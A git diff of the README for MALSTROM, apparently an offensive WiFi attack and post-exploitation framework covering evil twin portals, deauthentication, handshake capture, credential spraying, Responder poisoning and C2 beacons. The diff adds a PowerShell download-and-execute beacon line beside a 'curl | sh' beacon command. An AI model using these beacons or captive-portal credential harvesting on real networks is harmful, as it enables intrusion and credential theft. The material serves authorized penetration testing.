@@ -2,7 +2,7 @@
 
 ![MALSTROM Header](https://capsule-render.vercel.app/api?type=waving&color=0:00d2ff,100:3a7bd5&height=200&section=header&text=MALSTROM&fontSize=80&fontColor=ffffff&animation=fadeIn&fontAlignY=38)
 
-<img width="1376" height="768" alt="DarkSec Malstrom Operator Dashboard" src="https://github.com/user-attachments/assets/0a888476-03df-4973-9b29-517139c3ba60" />
+<img width="1376" alt="DarkSec Malstrom Operator Dashboard" src="https://github.com/user-attachments/assets/0a888476-03df-4973-9b29-517139c3ba60" />
 
 <!-- Static Badges -->
 ![License](https://img.shields.io/badge/License-Authorized--Use--Only-red.svg)
@@ -15,21 +15,23 @@
 ![Made with Love](https://img.shields.io/badge/Made%20with-%E2%9D%A4%EF%B8%8F-red)
 
 <!-- Dynamic GitHub Badges -->
-![Last Commit](https://img.shields.io/github/last-commit/wickednull/MALSTROM)
-![Issues](https://img.shields.io/github/issues/wickednull/MALSTROM)
-![Pull Requests](https://img.shields.io/github/issues-pr/wickednull/MALSTROM)
-![Stars](https://img.shields.io/github/stars/wickednull/MALSTROM?style=social)
-![Forks](https://img.shields.io/github/forks/wickednull/MALSTROM?style=social)
+![Last Commit](https://img.shields.io/github/last-commit/wickednull/malstrom)
+![Issues](https://img.shields.io/github/issues/wickednull/malstrom)
+![Pull Requests](https://img.shields.io/github/issues-pr/wickednull/malstrom)
+![Stars](https://img.shields.io/github/stars/wickednull/malstrom?style=social)
+![Forks](https://img.shields.io/github/forks/wickednull/malstrom?style=social)
 
-<br />
+---
 
-**MALSTROM** — An all-in-one WiFi attack & post-exploitation platform for Linux. Automates rogue access points, evil twin portals, deauth/disassociation, KARMA, MITM, recon, scanning, and lateral movement with a real-time operator dashboard, credential capture, exfil, and Lua-style modules for automation.
+### ⚡ All-in-One WiFi Attack & Post-Exploitation Framework for Linux
+
+MALSTROM automates rogue access point deployment, evil twin portals, deauth/disassociation attacks, KARMA spoofing, MITM poisoning, recon scanning, and lateral movement from a unified real-time dashboard.
 
 </div>
 
 ---
 
-### 📊 Project Stats
+## 📊 Project Stats
 
 | Metric | Value |
 | :--- | :--- |
@@ -42,11 +44,11 @@
 
 ---
 
-### 📖 Description
+## 📖 Description
 
-**DarkSec MALSTROM** automates the end-to-end WiFi attack vector from a single, unified process. Designed for security auditing and offensive wireless ops, it manages target SSID cloning, frame injection, and OS-adaptive captive portal deployment while exposing an interactive web dashboard bound to `http://127.0.0.1:8888`.
+**DarkSec MALSTROM** automates the end-to-end WiFi attack vector from a single process. It handles target SSID cloning, frame injection, and OS-adaptive captive portal deployment while driving an interactive web dashboard bound to `http://127.0.0.1:8888`.
 
-By carving out a virtual wireless interface (`ap0`) from a dedicated secondary radio, MALSTROM runs isolated rogue access point deployments while preserving active upstream internet management connections.
+The rogue AP runs on a virtual interface (`ap0`) carved from a spare radio to preserve active upstream management connections.
 
 ```text
 ┌─────────────────────────────────────────────────────────────────────────┐
@@ -61,97 +63,111 @@ By carving out a virtual wireless interface (`ap0`) from a dedicated secondary r
 │ [x] EAPOL/PMKID Sniffer     [ ] NetExec Spray          [ ] Responder    │
 ├─────────────────────────────────────────────────────────────────────────┤
 │ [ LAUNCH ATTACK CHAIN ]                                [ DISARM / STOP ]│
-├─────────────────────────────────────────────────────────────────────────┤
-│ LIVE SSE EVENT STREAM & MONITORING TABLE                                │
 └─────────────────────────────────────────────────────────────────────────┘
 
 > ⚠️ IMPORTANT
-> This tool is intended for authorized penetration testing, network troubleshooting, or educational research only. Unauthorized frame injection, rogue AP deployment, or credential harvesting on networks without prior written consent is illegal.
+> This tool is intended for authorized penetration testing, network troubleshooting, or educational research only. Unauthorized use against networks you do not own or have explicit permission to test is illegal.
 > 
 ✨ Features
- * Full-Chain WiFi Automation — Execute target cloning, deauthentication bursts, and OS-adaptive captive portals simultaneously.
- * Single-Pane Operator Dashboard — Web-based UI (127.0.0.1:8888) driven by a live SSE event stream for monitoring client tracking, ARP alerts, and harvested loot.
- * Non-Disruptive Wireless Architecture — Carves a virtual interface (ap0) out of spare wireless hardware to keep management up-links active.
- * Flexible Deauth Engine — Offers broadcast, targeted, and silent/adaptive frame injection modes.
- * Integrated Handshake & PMKID Capture — Automated EAPOL 4-way handshake sniffer and RSN PMKID extraction that isolates target traffic from local AP noise.
- * Post-Exploitation Pipeline — Built-in Wrappers for nmap host discovery, netexec credential spraying across SMB/SSH/RDP/WinRM, and Responder LLMNR/mDNS/NBT-NS poisoning.
- * Beacon Command & Control — Serves light-footprint, target-validated execution agents for POSIX (sh) and Windows (PowerShell).
- * Structured Vault Storage — Centralized local storage for captures, credentials, probe logs, and network maps.
+ * Zero-Configuration Deployment — Single command installation script that automatically sets up system dependencies, Python environments, and binary shortcuts.
+ * Real-Time Web UI — Operator dashboard running on 127.0.0.1:8888 backed by SSE live streams for real-time telemetry, credential feeds, and target maps.
+ * Virtual Radio Management — Carves an ap0 interface from secondary radio hardware to prevent management dropouts during rogue AP campaigns.
+ * Targeted Deauth Modes — Broadcast, targeted MAC, and silent adaptive modes that trigger frame injection only when active client traffic is detected.
+ * Automated Handshake & PMKID Harvesting — EAPOL 4-way sniffer and PMKID extractor with auto-filtering for internal access point traffic.
+ * Integrated Post-Exploitation — Automated nmap scanning, netexec credential spraying (SMB, SSH, RDP, WinRM), and Responder LLMNR/mDNS/NBT-NS poisoning.
+ * C2 Session Management — Generates lightweight payload beacons for POSIX (sh) and Windows (PowerShell) targets.
 🛠️ Requirements
- * OS: Linux (Kernel 5.x or higher) with root/sudo access.
- * Hardware: Minimum two WiFi interfaces (one supporting monitor mode/injection and one supporting AP mode).
- * Python Version: Python 3.9+
- * System Dependencies:
-   * Wireless & Core: hostapd, dnsmasq, iptables, iw, aireplay-ng, tcpdump
-   * Post-Exploitation: nmap, netexec, responder
+ * Hardware: Minimum 2 WiFi interfaces (1 supporting monitor mode/injection + 1 supporting AP mode).
+ * OS: Linux (Kernel 5.x or newer with root privileges).
+ * Dependencies:
+   * Core Binaries: bash, python3 (3.9+), hostapd, dnsmasq, iptables, iw, aireplay-ng, tcpdump
+   * Post-Ex Binaries: nmap, netexec, responder
 📋 Table of Contents
  * Installation
- * Quick Start
+ * Usage
  * Dashboard Workspaces
  * Post-Exploitation Modules
  * Capture & Deauth Specifications
- * Loot Vault & Maintenance
+ * Loot Storage & Maintenance
  * Repository Structure
  * Contributing
  * Disclaimer
  * License
 ⚙️ Installation
- * Clone the repository:
-   git clone [https://github.com/wickednull/MALSTROM.git](https://github.com/wickednull/MALSTROM.git)
-cd MALSTROM
+🚀 One-Line Quick Install
+Run the quick setup script to install all required dependencies, clone the repository, and register the system symlinks:
+curl -sSL [https://raw.githubusercontent.com/wickednull/malstrom/main/install.sh](https://raw.githubusercontent.com/wickednull/malstrom/main/install.sh) | sudo bash
 
- * Grant execution permissions to the binary:
-   chmod +x bin/malstrom
+🔧 Manual Installation
+If preferred, clone the repository and run the setup manually:
+# 1. Clone the repository
+git clone [https://github.com/wickednull/malstrom.git](https://github.com/wickednull/malstrom.git)
+cd malstrom
 
- * Perform an environment readiness audit:
-   sudo ./bin/malstrom --check
+# 2. Make binaries executable
+chmod +x bin/malstrom
 
-💻 Quick Start
-Run the primary launcher binary with elevated root permissions:
-# Full stack execution (engine + portal + dashboard)
-sudo ./bin/malstrom
+# 3. Install core system dependencies (Debian/Ubuntu/Kali)
+sudo apt update && sudo apt install -y \
+  python3 hostapd dnsmasq iptables iw \
+  aireplay-ng tcpdump nmap responder
+
+# 4. Perform environment readiness check
+sudo ./bin/malstrom --check
+
+💻 Usage
+Launch MALSTROM directly using the CLI management binary:
+# Full stack execution (Engine + Captive Portal + Web Dashboard)
+sudo malstrom
 
 # Launch and automatically open the operator dashboard in default browser
-sudo ./bin/malstrom --open
+sudo malstrom --open
 
 # Launch without token gate enforcement on localhost
-sudo ./bin/malstrom --no-auth
+sudo malstrom --no-auth
 
-CLI Management Commands
+🕹️ CLI Service Commands
 sudo malstrom start       # Start background daemon & display access details
 sudo malstrom launch      # Start daemon if needed and launch signed-in UI
 malstrom open             # Open dashboard with auto-filled access token
 malstrom token            # Print current operator access token
 
 🖥️ Dashboard Workspaces
-| Workspace | Description |
+| Tab | Functionality |
 |---|---|
-| Attack | Configure target BSSID/SSID/Channel, rogue portal operational modes, and deauth rates. |
-| Payload | Manage WPA handshake/PMKID sniffer parameters and upload custom captive HTML templates. |
-| Monitor | Real-time tracking of connected rogue-subnet clients, probe requests, and active KARMA responses. |
-| Loot | Multi-tab vault displaying collected credentials, device fingerprints, handshakes, and PCAP files. |
-| Recon | Subnet discovery and TCP port scanning (Nmap wrapper) linked directly to the Lateral module. |
-| Lateral | Automated credential spraying via netexec against discovered target hosts (SMB/SSH/RDP/WinRM). |
-| MITM | Integrated Responder controls for broadcast poisoning and NetNTLMv2 hash harvesting. |
-| Sessions | C2 agent session interface for interactive POSIX sh and PowerShell /beacon payloads. |
-| Settings | Operational controls for network interfaces, authentication tokens, and system resets. |
+| Attack | Configure BSSID/SSID/Channel targets, portal modes, and deauth burst rates. |
+| Payload | Manage WPA handshake/PMKID capture parameters and upload custom HTML portal templates. |
+| Monitor | Track connected rogue-subnet clients, view probe requests, and adopt target SSIDs. |
+| Loot | Multi-tab vault for credentials, device fingerprints, handshakes, probes, and PCAPs. |
+| Recon | Host discovery and TCP port scanning (Nmap wrapper) with direct feed to Lateral modules. |
+| Lateral | Automated credential spraying (netexec) testing portal creds against SMB/SSH/RDP/WinRM. |
+| MITM | Responder integration for LLMNR/mDNS/NBT-NS poisoning and NetNTLMv2 hash harvesting. |
+| Sessions | Command-and-control tasking interface for POSIX sh and PowerShell /beacon agents. |
+| Settings | Manage LAN binding, access tokens, beacon key rotation, and factory resets. |
 ⚙️ Post-Exploitation Modules
- * Recon & Mapping
-   Executes sweeps across target networks (including rogue 172.16.52.0/24 or local LAN CIDRs). Scanned hosts automatically feed into the lateral movement pipeline.
- * Lateral Movement (Credential Spray)
-   Wrapper for netexec that tests harvested portal credentials against discovered hosts:
-   netexec <protocol> <target_cidr> -u <user> -p <pass>
+1. Recon & Mapping
+Executes network sweeps across target subnets (including rogue 172.16.52.0/24 or accessible LAN CIDRs). Results feed directly into the credential spray engine.
+# Executed via Web Dashboard or CLI Orchestrator
+malstrom recon scan --target 172.16.52.0/24
 
-   Valid credentials generate [+] OWNED alerts and are logged to owned.json.
- * MITM & Poisoning
-   Runs Responder directly on the rogue AP interface to capture broadcast name resolution traffic (LLMNR/mDNS/NBT-NS). Intercepted NetNTLMv2 hashes are pre-formatted for hashcat.
- * Beacon Sessions
-   Deploys C2 execution agents for target validation and persistent shell access:
-   * POSIX: curl -s http://<portal-ip>/beacon | sh
-   * PowerShell: http://<portal-ip>/beacon.ps1
+2. Lateral Movement (Credential Spray)
+Runs netexec against target hosts using harvested credentials across supported protocols:
+netexec <protocol> <target_cidr> -u <user> -p <pass>
+
+Successful authentication vectors are flagged with [+] OWNED alerts and committed to owned.json.
+3. MITM & Poisoning
+Spawns Responder on the rogue AP interface to intercept broadcast name resolution requests (LLMNR/mDNS/NBT-NS). Captured NetNTLMv2 hashes are formatted for hashcat and indexed directly into the Loot vault.
+4. Beacon Sessions
+Generates light footprint agent scripts for target command execution:
+# POSIX Shell Target
+curl -s http://<portal-ip>/beacon | sh
+
+# PowerShell Target
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<portal-ip>/beacon.ps1')"
+
 📊 Capture & Deauth Specifications
 WPA Capture Vectors
-| Mode | Target Frame Types | Output |
+| Capture Mode | Target Frame Types | Harvest Output |
 |---|---|---|
 | handshake | EAPOL 4-Way Handshake (Msg1 + Msg2) | Captured .pcap & handshakes.json |
 | pmkid | RSN PMKID Elements (00 0f ac 04) | Extracted PMKID hashes |
@@ -159,25 +175,29 @@ WPA Capture Vectors
 Deauth Operating Modes
 | Mode | Operation Mechanics |
 |---|---|
-| broadcast | Transmits FF:FF:FF:FF:FF:FF deauthentication frames across the target channel. |
-| targeted | Restricts frame injection to specifically discovered client MAC addresses. |
-| adaptive | Silent monitoring that triggers targeted bursts only when client traffic is observed. |
-| off | Disables active frame injection while maintaining passive capture and portal deployment. |
-📝 Loot Vault & Maintenance
-Data collected during operations is recorded under ~/loot/malstrom/ (or /var/lib/malstrom when running system daemon modes):
+| broadcast | Sends FF:FF:FF:FF:FF:FF deauthentication frames to the entire target channel. |
+| targeted | Limits deauth frames exclusively to discovered client MACs on the target AP. |
+| adaptive | Operates silently, triggering targeted deauth bursts only when client traffic is observed. |
+| off | Disables frame injection; keeps passive capture and evil-twin portals active. |
+📝 Loot Storage & Maintenance
+Harvested data is stored locally in ~/loot/malstrom/ (or /var/lib/malstrom when executed as a system service):
 ~/loot/malstrom/
-├── creds.json          # Captured portal credentials
+├── creds.json          # Harvested portal credentials
 ├── devices.json        # Client fingerprints (MAC, Hostname, OS, User-Agent)
 ├── handshakes.json     # Indexed EAPOL and PMKID captures
-├── hashes.json         # Intercepted NetNTLMv2 hashes
-├── owned.json          # Validated lateral movement pairs
+├── hashes.json         # Intercepted NetNTLMv2 hashes (Hashcat format)
+├── owned.json          # Validated lateral movement target pairs
 ├── probes.json         # Logged Karma probe requests
 ├── pcaps/              # Raw 802.1X frame captures (.pcap)
-└── scans.json          # Cached network recon output
+└── scans.json          # Network recon cache
 
-System Reset Options
- * Wipe Loot: sudo malstrom wipe-loot — Flushes harvested loot while leaving configuration intact.
- * Factory Reset: sudo malstrom reset — Halts running daemons, clears loot, resets system state, and deletes access tokens.
+Maintenance Commands
+# Wipe Loot: Clears captured loot while preserving system configuration
+sudo malstrom wipe-loot
+
+# Factory Reset: Halts running daemons, deletes all loot, resets state, and clears access tokens
+sudo malstrom reset
+
 📂 Repository Structure
 MALSTROM/
 ├── bin/
@@ -197,18 +217,18 @@ MALSTROM/
     └── templates/      # OS-adaptive captive portal templates
 
 🤝 Contributing
-Contributions are welcome! To contribute:
- * Fork the repo.
- * Create a feature branch (git checkout -b feature/amazing-feature).
+Contributions are welcome!
+ * Fork the repository (https://github.com/wickednull/malstrom/fork).
+ * Create your feature branch (git checkout -b feature/amazing-feature).
  * Commit your changes (git commit -m 'Add amazing feature').
  * Push to the branch (git push origin feature/amazing-feature).
  * Open a Pull Request.
 ⚠️ Disclaimer
-Use at your own risk. The authors assume no liability for misuse or damage caused by this software. DarkSec MALSTROM is provided as-is for security research and authorized testing purposes only. Always obtain proper written permission prior to testing networks or devices.
+Use at your own risk. The authors assume no liability for misuse or damage caused by this tool. MALSTROM is provided as-is for security research and authorized testing only. Always obtain proper written permission before testing on any network or device.
 📄 License
-Distributed under the Custom Security Research / Authorized-Use License. See LICENSE for details.
+Distributed under the MIT License. See LICENSE for details.
 <div align="center">
-Project Link: https://github.com/wickednull/MALSTROM
+Project Link: https://github.com/wickednull/malstrom
 Author: wickednull
 Organization: DarkSec
 Happy (ethical) hacking! 🏴‍☠️
